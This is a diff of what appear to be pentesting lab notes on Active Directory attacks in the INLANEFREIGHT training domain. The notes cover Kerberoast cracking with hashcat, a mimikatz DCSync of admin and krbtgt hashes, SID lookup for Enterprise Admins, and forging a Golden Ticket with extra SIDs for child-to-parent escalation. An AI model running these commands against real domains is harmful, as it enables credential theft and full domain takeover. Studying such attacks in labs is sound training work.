@@ -91,10 +91,11 @@ $ hashcat -m 13100 sqldev_tgs.hashcat /usr/share/wordlists/rockyou.txt
 ```
 # DCSync
 Mimikatz must be ran in the context of the user who has DCSync privileges and only one user can be attacked at a time.
+- Using `runas`
 ```cmd-shell
 > runas /netonly /user:INLANEFREIGHT\adunn powershell
 ```
-
+- Using 
 ```powershell
 PS > .\mimikatz.exe
 mimikatz # privilege::debug
@@ -109,13 +110,14 @@ mimikatz # lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\admin
 mimikatz > lsadump::dcsync /user:LOGISTICS\krbtgt
 ```
 - Get current child domain SID using [[PowerView#[Get-DomainSID](https //powersploit.readthedocs.io/en/latest/Recon/Get-DomainSID/)|Get-DomainSID]]
-- Get SID for Enterprise Admins group in the parent domain either with [[ActiveDirectory#[Get-ADGroup](https //docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps)|Get-ADGroup]] or [[PowerView#[Get-DomainGroup](https //powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroup/)|Get-DomainGroup]]
+- Get SID for Enterprise Admins group in the parent domain either with [[ActiveDirectory#[Get-ADGroup](https //docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps)|Get-ADGroup]] or [[PowerView#[Get-DomainGroup](https //powersploit.readthedocs.io/en/latest/Recon/Get-DomainGroup/)|Get-DomainGroup]]:
 ```powershell
+PS > Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL"
 PS > Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
 ```
 - Request a Golden Ticket:
 ```powershell
-mimikatz > kerberos::golden /user:hacker /domain:<CHILD-DOMAIN-FQDN> /sid:<CHILD-DOMAIN-SID> /krbtgt:<KTBTGT> /sids:<ROOT-DOMAIN-ENTERPRISE-ADMIN-SID> /ptt
+mimikatz > kerberos::golden /user:hacker /domain:<CHILD-DOMAIN-FQDN> /sid:<CHILD-DOMAIN-SID> /krbtgt:<KRBTGT-NTHash> /sids:<ROOT-DOMAIN-ENTERPRISE-ADMIN-SID> /ptt
 ```
 The ticket can be confirmed with [[klist]]. And if the attack is successful, we should be able to read DC's whole C drive!
 ```powershell
